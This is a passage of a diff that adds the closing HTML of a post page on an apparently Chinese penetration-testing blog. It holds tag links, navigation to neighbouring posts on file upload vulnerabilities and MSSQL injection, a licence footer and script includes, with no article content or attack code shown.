+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>,&nbsp;<a href="/tags/%E6%8F%90%E6%9D%83/">提权</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="prev" rel="prev" title="文件上传漏洞相关"><i class="fas fa-angle-left fa-fw"></i>文件上传漏洞相关</a>
+            <a href="/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" class="next" rel="next" title="MSSQL 注入与提权方法整理">MSSQL 注入与提权方法整理<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
